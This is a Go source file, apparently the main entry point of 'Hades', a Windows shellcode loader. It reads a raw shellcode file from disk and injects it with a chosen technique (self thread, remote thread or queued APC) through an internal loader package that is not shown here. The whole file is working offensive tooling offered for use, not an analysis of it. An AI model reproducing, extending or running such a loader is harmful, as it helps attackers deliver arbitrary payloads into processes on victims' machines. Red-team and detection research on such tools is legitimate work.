//go:build windows
// +build windows

package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"

	"github.com/f1zm0/hades/internal/loader"
)

var (
	// version
	version = "dev"

	// date (build date).
	date = time.Now().Format("02/01/06")

	// author.
	author = "@f1zm0"

	// supported injection techniques
	techniques = []string{
		"selfthread",
		"remotethread",
		"queueuserapc",
	}
)

func getBanner() string {
	return fmt.Sprintf(`	
  '||'  '||'     |     '||''|.   '||''''|   .|'''.|  
   ||    ||     |||     ||   ||   ||  .     ||..  '  
   ||''''||    |  ||    ||    ||  ||''|      ''|||.  
   ||    ||   .''''|.   ||    ||  ||       .     '|| 
  .||.  .||. .|.  .||. .||...|'  .||.....| |'....|' 

          version: %s [%s] :: %s
`, version, date, author)
}

type options struct {
	shellcodeFilePath  string
	injectionTechnique string
}

func parseCLIFlags() options {
	flag.Usage = func() {
		helpMsg := []string{
			"Usage:",
			"  hades [options] ",
			"",
			"Options:",
			"  -f, --file <str>    shellcode file path (.bin)",
			"  -t, --technique     injection technique to use ( selfthread, remotethread, queueuserapc)",
			"",
			"Examples",
			"hades -f shellcode.bin -t selfthread",
		}

		fmt.Fprint(os.Stderr, strings.Join(helpMsg, "\n"))
	}

	opts := options{}

	flag.StringVar(&opts.shellcodeFilePath, "f", "", "")
	flag.StringVar(&opts.shellcodeFilePath, "file", "", "")

	flag.StringVar(&opts.injectionTechnique, "t", "queueuserapc", "")
	flag.StringVar(&opts.injectionTechnique, "technnique", "queueuserapc", "")

	flag.Parse()

	return opts
}

func contains(s []string, e string) bool {
	for _, a := range s {
		if e == a {
			return true
		}
	}
	return false
}

func main() {
	fmt.Println(getBanner())
	opts := parseCLIFlags()

	// check if shellcode file exists
	if _, err := os.Stat(opts.shellcodeFilePath); os.IsNotExist(err) {
		fmt.Println("[-] shellcode file not found")
		os.Exit(1)
	}

	// check if injection technique is supported by checking if the user-provided name is in techniques slice
	if !contains(techniques, opts.injectionTechnique) {
		fmt.Println("[-] injection technique not supported")
		os.Exit(1)
	}

	// read binary file content
	buf, err := ioutil.ReadFile(opts.shellcodeFilePath)
	if err != nil {
		fmt.Println(err)
	}

	ldr, err := loader.NewLoader()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	// wait for user to click enter to continue
	fmt.Println("Press enter to continue...")
	_, _ = fmt.Scanln()

	if err := ldr.Load(buf, opts.injectionTechnique); err != nil {
		fmt.Printf("An error occured:\n%s\n", err.Error())
	}
}
